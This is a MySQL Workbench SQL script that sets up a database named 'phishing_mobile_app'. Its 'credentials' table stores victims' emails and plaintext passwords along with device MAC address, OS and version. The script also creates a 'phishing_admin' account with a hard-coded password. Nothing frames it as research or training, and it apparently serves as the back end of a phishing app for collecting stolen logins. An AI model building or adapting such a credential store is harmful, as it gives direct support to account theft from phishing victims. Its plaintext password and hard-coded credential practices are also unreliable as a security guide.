-- MySQL Workbench Forward Engineering

SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0;
SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0;
SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION';

-- -----------------------------------------------------
-- Schema phishing_mobile_app
-- -----------------------------------------------------
DROP SCHEMA IF EXISTS `phishing_mobile_app` ;

-- -----------------------------------------------------
-- Schema phishing_mobile_app
-- -----------------------------------------------------
CREATE SCHEMA IF NOT EXISTS `phishing_mobile_app` DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci ;
USE `phishing_mobile_app` ;

-- -----------------------------------------------------
-- Table `phishing_mobile_app`.`credentials`
-- -----------------------------------------------------
DROP TABLE IF EXISTS `phishing_mobile_app`.`credentials` ;

CREATE TABLE IF NOT EXISTS `phishing_mobile_app`.`credentials` (
  `id` BIGINT NOT NULL AUTO_INCREMENT,
  `email` VARCHAR(300) NOT NULL,
  `password` VARCHAR(300) NOT NULL,
  `mac` VARCHAR(50) NULL,
  `os` VARCHAR(50) NULL,
  `version` VARCHAR(50) NULL,
  `date` DATETIME NULL,
  PRIMARY KEY (`id`))
ENGINE = InnoDB;

SET SQL_MODE = '';
DROP USER IF EXISTS phishing_admin@127.0.0.1;
SET SQL_MODE='ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION';
CREATE USER 'phishing_admin'@'127.0.0.1' IDENTIFIED BY 'phishingmobileapp';

GRANT ALL ON `phishing_mobile_app`.* TO 'phishing_admin'@'127.0.0.1';
SET SQL_MODE = '';
DROP USER IF EXISTS phishing_admin@localhost;
SET SQL_MODE='ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION';
CREATE USER 'phishing_admin'@'localhost' IDENTIFIED BY 'phishingmobileapp';

GRANT ALL ON `phishing_mobile_app`.* TO 'phishing_admin'@'localhost';

SET SQL_MODE=@OLD_SQL_MODE;
SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS;
SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS;
